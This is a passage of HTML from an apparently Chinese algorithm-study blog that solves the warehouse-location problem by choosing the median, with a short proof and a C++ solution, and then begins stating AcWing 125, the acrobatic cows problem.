style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>现在需要在数轴上建立一家货仓，每天清晨，从货仓到每家商店都要运送一车商品。</p><p>为了提高效率，求把货仓建在何处，可以使得货仓到每家商店的距离之和最小。</p><p><strong>输入格式</strong></p><p>第一行输入整数 N。</p><p>第二行 N 个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub><mo>∼</mo><msub><mi>A</mi><mi>N</mi></msub></mrow><annotation encoding="application/x-tex">A_1\sim A_N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示距离之和的最小值。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>100000</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1\le N\le 100000,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">100000</span><span class="mpunct">,</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo><msub><mi>A</mi><mi>i</mi></msub><mo>≤</mo><mn>40000</mn></mrow><annotation encoding="application/x-tex">0\le A_i\le 40000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">40000</span></span></span></span></p><p><strong>输入样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">6 2 9 1</span><br></pre></td></tr></table></figure><p><strong>输出样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12</span><br></pre></td></tr></table></figure><h3 id="贪心-7">贪心</h3><p><strong>做法</strong> 取中点作为仓库</p><blockquote><p>对于奇数来说，中点为最中间的点<br>对于偶数来说，中点可以取最中间的两个点中的任意一个，或者二者之间任意点皆可</p><p>区间[left, right]的中点为(left + right) &gt;&gt; 1, 因此这里取<code>a[n &gt;&gt; 1]</code>为中点即可</p></blockquote><p><strong>分析</strong></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd class="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi mathvariant="normal">∣</mi><mi>x</mi><mo>−</mo><msub><mi>x</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><mo>+</mo><mi mathvariant="normal">∣</mi><mi>x</mi><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mo>+</mo><mo>⋯</mo><mo>+</mo><mi mathvariant="normal">∣</mi><mi>x</mi><mo>−</mo><msub><mi>x</mi><mi>n</mi></msub><mi mathvariant="normal">∣</mi></mrow></mstyle></mtd><mtd class="mtr-glue"></mtd><mtd class="mml-eqn-num"></mtd></mtr><mtr><mtd class="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>x</mi><mo>−</mo><msub><mi>x</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><mo>+</mo><mi mathvariant="normal">∣</mi><mi>x</mi><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>x</mi><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mo>+</mo><mi mathvariant="normal">∣</mi><mi>x</mi><mo>−</mo><msub><mi>x</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo><mo>+</mo><mo>⋯</mo></mrow></mstyle></mtd><mtd class="mtr-glue"></mtd><mtd class="mml-eqn-num"></mtd></mtr><mtr><mtd class="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≥</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mi>n</mi></msub><mo>−</mo><msub><mi>x</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mo>⋯</mo></mrow></mstyle></mtd><mtd class="mtr-glue"></mtd><mtd class="mml-eqn-num"></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align}    f(x) &amp;= |x-x_1|+|x-x_2|+\cdots + |x-x_n|\\&amp;=(|x-x_1| + |x-x_2|) + (|x-x_2|+|x-x_{n-1}|) +\cdots\\&amp;\ge(x_n - x_1)+(x_{n-1}-x_2)+\cdots \\ \end{align}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.5em;vertical-align:-2em;"></span><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner">⋯</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner">⋯</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span></span></span><span class="tag"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.5em;"><span class="pstrut" style="height:2.84em;"></span><span class="eqn-num"></span></span><span style="top:-3em;"><span class="pstrut" style="height:2.84em;"></span><span class="eqn-num"></span></span><span style="top:-1.5em;"><span class="pstrut" style="height:2.84em;"></span><span class="eqn-num"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span></span></span></span></p><p>当x取重点时都能取到等号，所以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≥</mo></mrow><annotation encoding="application/x-tex">\ge</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mrel">≥</span></span></span></span>后的值即为最小值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(a, a + n);</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    res += <span class="built_in">abs</span>(a[i] - a[n &gt;&gt; <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="推公式">推公式</h1><h2 id="AcWing-125-耍杂技的牛">AcWing 125. 耍杂技的牛</h2><p>农民约翰的 N 头奶牛（编号为 1…N）计划逃跑并加入马戏团，为此它们决定练习表演杂技。</p><p>奶牛们不是非常有创意，只提出了一个杂技表演：</p><p>叠罗汉，表演时，奶牛们站在彼此的身上，形成一个高高的垂直堆叠。</p><p>奶牛们正在试图找到自己在这个堆叠中应该所处的位置顺序。</p><p>这 N 头奶牛中的每一头都有着自己的重量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">W_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 以及自己的强壮程度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>一头牛支撑不住的可能性取决于它头上所有牛的总重量（不包括它自己）减去它的身体强壮程度的值，现在称该数值为风险值，风险值越大，这只牛撑不住的可能性越高。</p><p>您的任务是确定奶牛的排序，使得所有奶牛的风险值中的最大值尽可能的小。</p><p><strong>输入格式</strong></p><p>第一行输入整数 N，表示奶牛数量。</p><p>接下来 N 行，每行输入两个整数，表示牛的重量和强壮程度，第 i 行表示第 i 头牛的重量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">W_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 以及它的强壮程度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最大风险值的最小可能值。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>50000</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1≤N≤50000,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">50000</span><span class="mpunct">,</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>W</mi><mi>i</mi><mo>≤</mo><mn>10</mn><mo separator="true">,</mo><mn>000</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1≤Wi≤10,000,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal">Wi</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span><span class="mpunct">,</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>S</mi><mi>i</mi><mo>≤</mo><mn>1</mn><mo separator="true">,</mo><mn>000</mn><mo separator="true">,</mo><mn>000</mn><mo separator="true">,</mo><mn>000</mn></mrow><annotation encoding="application/x-tex">1≤Si≤1,000,000,000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span></span></span></span></p><p><strong>输入样例：</strong></p><figure class="highlight plaintext"><table><tr><td 